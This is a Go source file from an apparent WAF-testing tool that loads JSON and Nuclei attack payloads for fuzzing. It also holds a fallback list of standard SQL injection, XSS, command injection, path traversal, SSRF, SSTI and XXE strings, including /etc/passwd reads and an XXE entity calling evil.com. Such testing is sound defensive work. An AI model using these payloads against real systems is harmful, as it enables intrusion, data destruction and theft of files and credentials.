package main

import (
	"fmt"
	"strings"

	"github.com/waftester/waftester/pkg/payloadprovider"
	"github.com/waftester/waftester/pkg/payloads"
	"github.com/waftester/waftester/pkg/ui"
)

// ─────────────────────────────────────────────────────────────────────────────
// Unified payload loading helpers for ALL CLI commands.
//
// These functions bridge the JSON payload database with the Nuclei template
// payload corpus, providing every command with access to 2800+ JSON payloads
// AND ~226 Nuclei template vectors through a single API.
//
// Usage:
//
//	// Simple: load all payloads from both sources
//	payloads, provider, err := loadUnifiedPayloads(defaults.PayloadDir, defaults.TemplateDir, verbose)
//
//	// Filtered: load by category with alias resolution
//	payloads, err := loadUnifiedByCategory(defaults.PayloadDir, defaults.TemplateDir, "sqli", verbose)
//
//	// Protocol fuzz: get payload strings for a scan type (replaces hardcoded lists)
//	payloads := getUnifiedFuzzPayloads(defaults.PayloadDir, defaults.TemplateDir, "xss", 50, verbose)
// ─────────────────────────────────────────────────────────────────────────────

// loadUnifiedPayloads loads payloads from both JSON and Nuclei sources.
// Returns the raw JSON payloads (for backward-compatible callers), the provider
// (for callers needing unified access), and any error.
//
// If Nuclei template loading fails, it silently continues with JSON-only.
func loadUnifiedPayloads(payloadDir, templateDir string, verbose bool) ([]payloads.Payload, *payloadprovider.Provider, error) {
	provider := payloadprovider.NewProvider(payloadDir, templateDir)
	if err := provider.Load(); err != nil {
		return nil, nil, fmt.Errorf("loading payloads: %w", err)
	}

	jp, err := provider.JSONPayloads()
	if err != nil {
		return nil, nil, fmt.Errorf("extracting JSON payloads: %w", err)
	}

	if verbose {
		stats, _ := provider.GetStats()
		if stats.NucleiPayloads > 0 {
			ui.PrintInfo(fmt.Sprintf("Unified payload engine: %d JSON + %d Nuclei = %d total payloads",
				stats.JSONPayloads, stats.NucleiPayloads, stats.TotalPayloads))
		}
	}

	return jp, provider, nil
}

// loadUnifiedByCategory loads payloads matching a category from both sources,
// using the category mapper for alias resolution (e.g. "sqli" → "SQL-Injection").
func loadUnifiedByCategory(payloadDir, templateDir, category string, verbose bool) ([]payloads.Payload, error) {
	provider := payloadprovider.NewProvider(payloadDir, templateDir)
	if err := provider.Load(); err != nil {
		return nil, fmt.Errorf("loading payloads: %w", err)
	}

	// Get all unified payloads matching the category (includes Nuclei)
	unified, err := provider.GetByCategory(category)
	if err != nil {
		return nil, fmt.Errorf("filtering category %q: %w", category, err)
	}

	// Also get raw JSON payloads for backward-compatible callers
	jp, err := provider.JSONPayloads()
	if err != nil {
		return nil, fmt.Errorf("extracting JSON payloads: %w", err)
	}

	// Apply category filter to JSON payloads
	filtered := payloads.Filter(jp, category, "")

	if verbose && len(unified) > len(filtered) {
		extra := len(unified) - len(filtered)
		ui.PrintInfo(fmt.Sprintf("Category %q: %d JSON + %d Nuclei payloads",
			category, len(filtered), extra))
	}

	return filtered, nil
}

// getUnifiedFuzzPayloads returns payload strings suitable for protocol fuzzing
// (OpenAPI, gRPC, SOAP, etc.). It replaces hardcoded payload lists by loading
// from the unified database with a limit cap.
//
// If loading fails, it falls back to a minimal hardcoded set so protocol
// scanners never fail due to missing payload files.
func getUnifiedFuzzPayloads(payloadDir, templateDir, category string, limit int, verbose bool) []string {
	provider := payloadprovider.NewProvider(payloadDir, templateDir)
	if err := provider.Load(); err != nil {
		if verbose {
			ui.PrintWarning(fmt.Sprintf("Could not load unified payloads for %s fuzzing: %v (using fallback)", category, err))
		}
		return getFallbackFuzzPayloads(category)
	}

	unified, err := provider.GetByCategory(category)
	if err != nil || len(unified) == 0 {
		if verbose {
			ui.PrintWarning(fmt.Sprintf("No unified payloads for category %q (using fallback)", category))
		}
		return getFallbackFuzzPayloads(category)
	}

	// Cap at limit
	if limit > 0 && len(unified) > limit {
		unified = unified[:limit]
	}

	result := make([]string, 0, len(unified))
	for _, up := range unified {
		result = append(result, up.Payload)
	}

	if verbose {
		ui.PrintInfo(fmt.Sprintf("Loaded %d %s payloads from unified database", len(result), category))
	}

	return result
}

// getFallbackFuzzPayloads returns a minimal hardcoded payload set for when
// the unified database is unavailable. This ensures protocol scanners never
// fail completely.
func getFallbackFuzzPayloads(category string) []string {
	lower := strings.ToLower(category)
	switch {
	case lower == "sqli" || lower == "sql-injection":
		return []string{
			"' OR '1'='1",
			"1; DROP TABLE users--",
			"admin'--",
			"1 UNION SELECT * FROM users",
			"'; EXEC xp_cmdshell('dir')--",
		}
	case lower == "xss":
		return []string{
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"javascript:alert(1)",
			"<svg onload=alert(1)>",
			"'\"><script>alert(1)</script>",
		}
	case lower == "cmdi" || lower == "command-injection":
		return []string{
			"; cat /etc/passwd",
			"| whoami",
			"`id`",
			"$(cat /etc/passwd)",
		}
	case lower == "traversal" || lower == "path-traversal" || lower == "lfi":
		return []string{
			"../../../etc/passwd",
			"....//....//....//etc/passwd",
			"..%2F..%2F..%2Fetc%2Fpasswd",
		}
	case lower == "ssrf":
		return []string{
			"http://169.254.169.254/latest/meta-data/",
			"http://localhost:22",
			"http://127.0.0.1/admin",
		}
	case lower == "ssti":
		return []string{
			"{{7*7}}",
			"${7*7}",
			"{{config}}",
			"<%= 7*7 %>",
		}
	case lower == "xxe":
		return []string{
			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>`,
		}
	default:
		return []string{
			"' OR '1'='1",
			"<script>alert(1)</script>",
			"; cat /etc/passwd",
			"../../../etc/passwd",
			"{{7*7}}",
			"${7*7}",
		}
	}
}
